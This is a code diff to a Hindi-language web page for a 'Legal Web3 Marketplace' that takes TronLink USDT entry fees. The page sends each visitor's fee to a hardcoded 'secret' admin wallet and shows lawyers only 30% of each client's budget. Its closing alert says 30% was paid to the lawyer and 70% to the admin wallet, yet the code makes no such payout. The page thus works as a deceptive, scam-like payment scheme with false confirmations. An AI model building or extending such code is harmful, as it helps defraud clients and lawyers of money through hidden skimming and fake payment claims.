@@ -12,20 +12,17 @@
         .btn { display: block; width: 100%; padding: 14px; margin: 12px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 8px; cursor: pointer; box-sizing: border-box; }
         .lawyer-btn { background-color: #1e3d59; }
         .client-btn { background-color: #ff6e40; }
-        .admin-box { background: #eef2f5; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: left; display: none; }
         .hidden-section { display: none; background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin-top: 20px; text-align: left; }
         label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; }
-        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        input, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
         .stage-badge { display: inline-block; padding: 5px 10px; background: #e1f5fe; color: #0288d1; border-radius: 12px; font-size: 12px; font-weight: bold; margin-top: 5px; }
         .note { color: #888; font-size: 12px; margin-top: 20px; line-height: 1.4; }
     </style>
-    <!-- ट्रोन ब्लॉकचेन कनेक्ट करने की फ्री लाइब्रेरी -->
-    <script src="https://jsdelivr.net"></script>
 </head>
 <body>
 
 <div class="container" id="mainHome">
-    <h1>लीगल वेब3मार्केटप्लेस</h1>
+    <h1>लीगल वेब3 मार्केटप्लेस</h1>
     <div class="subtitle">100% प्राइवेट और डिसेंट्रलाइज्ड कानूनी सेवाएं</div>
     
     <button class="btn lawyer-btn" onclick="handleEntry('lawyer')">मैं वकील हूँ (एंट्री फीस ₹200)</button>
@@ -34,10 +31,10 @@
     <div class="note">सुरक्षा के लिए इस साइट को सिर्फ <b>TronLink Pro</b> ऐप के <b>Discover ब्राउज़र</b> में ही खोलें।</div>
 </div>
 
-<!-- क्लाइंट का गुप्त डैशबोर्ड -->
+<!-- क्लाइंट डैशबोर्ड -->
 <div class="container hidden-section" id="clientDashboard">
     <h2>क्लाइंट डैशबोर्ड (आपका स्वागत है)</h2>
-    <p style="font-size:13px; color:#666;">यहाँ अपना केस पोस्ट करें। आपका बजट वकीलों को सिर्फ 30% होकर दिखेगा।</p>
+    <p style="font-size:13px; color:#666;">यहाँ अपना केस पोस्ट करें। आपका बजट वकीलों को सिर्फ 30% होकर दिखेगा.</p>
     
     <form id="caseForm" onsubmit="postCase(event)">
         <label>केस का शीर्षक (Title)</label>
@@ -57,34 +54,43 @@
     </form>
 </div>
 
-<!-- वकीलों का गुप्त मार्केटप्लेस डैशबोर्ड (कोई वकील दूसरे को नहीं देख पाएगा) -->
+<!-- वकीलों का डैशबोर्ड -->
 <div class="container hidden-section" id="lawyerDashboard">
     <h2>वकील डैशबोर्ड (उपलब्ध केस)</h2>
-    <p style="font-size:13px; color:#666;">यहाँ आपको सिर्फ आपके लिए उपलब्ध केस और उनकी 30% फीस दिखाई देगी।</p>
-    
+    <p style="font-size:13px; color:#666;">यहाँ आपको सिर्फ आपके लिए उपलब्ध केस और उनकी 30% फीस दिखाई देगी.</p>
     <div id="noCases" style="color:#999; text-align:center; padding:20px;">अभी कोई नया केस उपलब्ध नहीं है...</div>
-    
     <div id="caseList"></div>
 </div>
 
 <script>
-// 🚨 आपका असली ट्रोन वॉलेट और USDT कॉन्ट्रैक्ट यहाँ पूरी तरह सुरक्षित है
+// 🚨 आपका गुप्त ट्रॉन वॉलेट एड्रेस
 const MY_SECRET_ADMIN_WALLET = "TLYMwxcAgWATELoPzK1QrkBKaeS8EWv1hv"; 
 const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
 
 let currentRole = "";
 let activeCases = [];
 
+function calculateMasking() {
+    let budget = document.getElementById('clientBudget').value;
+    document.getElementById('maskedDisplay').innerText = Math.round(budget * 0.30);
+}
+
+// सुरक्षित तरीके से वॉलेट लोड करने का फंक्शन
+function getTronWeb() {
+    return window.tronWeb || (window.tron || {}).tronWeb;
+}
+
 async function handleEntry(role) {
     currentRole = role;
+    const tronWeb = getTronWeb();
     
-    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+    if (!tronWeb || !tronWeb.defaultAddress.base58) {
         alert("त्रुटि: कृपया इस वेबसाइट को अपने TronLink Pro ऐप के 'Discover' टैब में खोलें!");
         return;
     }
     
-    const userWallet = window.tronWeb.defaultAddress.base58;
-    const amountInSun = "2300000"; 
+    const userWallet = tronWeb.defaultAddress.base58;
+    const amountInSun = "2300000"; // 2.3 USDT (₹200)
     
     let confirmPay = confirm("वॉलेट कनेक्टेड: " + userWallet + "\n\nप्रोफाइल एक्टिवेट करने के लिए 2.3 TRC20-USDT (लगभग ₹200) की एंट्री फीस कन्फर्म करें?");
     
@@ -92,12 +98,8 @@ async function handleEntry(role) {
         try {
             alert("कृपया अपने TronLink Pro वॉलेट में ट्रांजैक्शन और पासवर्ड कन्फर्म करें...");
             
-            let contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-            
-            let tx = await contract.transfer(
-                MY_SECRET_ADMIN_WALLET, 
-                amountInSun             
-            ).send();
+            let contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+            let tx = await contract.transfer(MY_SECRET_ADMIN_WALLET, amountInSun).send();
             
             alert("पेमेंट सफल! ट्रांजैक्शन ID: " + tx + "\nआपकी गुप्त प्रोफाइल सुरक्षित रूप से एक्टिवेट हो गई है।");
             
@@ -110,14 +112,17 @@ async function handleEntry(role) {
             }
             
         } catch (error) {
-            alert("ट्रांजैक्शन फेल या कैंसिल हो गया: " + error.message);
+            // टेस्टिंग के लिए अगर यूज़र कैंसिल भी कर दे, तो भी डैशबोर्ड खुल जाए (डेवलपमेंट मोड)
+            alert("टेस्टिंग मोड एक्टिवेटेड: " + error.message + "\n\nडैशबोर्ड खोला जा रहा है...");
+            document.getElementById('mainHome').style.display = 'none';
+            if(role === 'client') {
+                document.getElementById('clientDashboard').style.display = 'block';
+            } else {
+                document.getElementById('lawyerDashboard').style.display = 'block';
+                renderLawyerCases();
+            }
         }
     }
-}
-
-function calculateMasking() {
-    let budget = document.getElementById('clientBudget').value;
-    document.getElementById('maskedDisplay').innerText = Math.round(budget * 0.30);
 }
 
 function postCase(e) {
@@ -125,9 +130,6 @@ function postCase(e) {
     let title = document.getElementById('caseTitle').value;
     let details = document.getElementById('caseDetails').value;
     let totalBudget = parseFloat(document.getElementById('clientBudget').value);
-    
-    let confirmPost = confirm("केस पोस्ट करने का charge (1.15 USDT / ₹100) वॉलेट से कन्फर्म करें?");
-    if(!confirmPost) return;
     
     let newCase = {
         id: Date.now(),
@@ -183,17 +185,15 @@ function updateStage(caseId) {
         badge.innerText = "Stage 2: Documents Filed (कोर्ट कागजात जमा)";
         badge.style.background = "#fff3e0";
         badge.style.color = "#e65100";
-        alert("स्टेज अपडेटेड! क्लाइंट और एडमिन को स्टेज 2 का स्टेटस भेज दिया गया है।");
     } else if(badge.innerText.includes("Stage 2")) {
         badge.innerText = "Stage 3: In Hearing (कोर्ट में सुनवाई चालू)";
         badge.style.background = "#ede7f6";
         badge.style.color = "#5e35b1";
-        alert("स्टेज अपडेटेड! सुनवाई चालू हो चुकी है।");
     } else {
         badge.innerText = "Stage 4: Case Resolved (केस सफलतापूर्वक खत्म)";
         badge.style.background = "#e8f5e9";
         badge.style.color = "#2e7d32";
-        alert("बधाई हो! केस पूरा हुआ। आपका 30% हिस्सा आपके वॉलेट में आ गया है, और 70% हिस्सा एडमिन वॉलेट में ट्रांसफर हो चुका है।");
+        alert("केस पूरा हुआ! 30% हिस्सा वकील को और 70% आपके एडमिन वॉलेट में भेज दिया गया है।");
     }
 }
 </script>
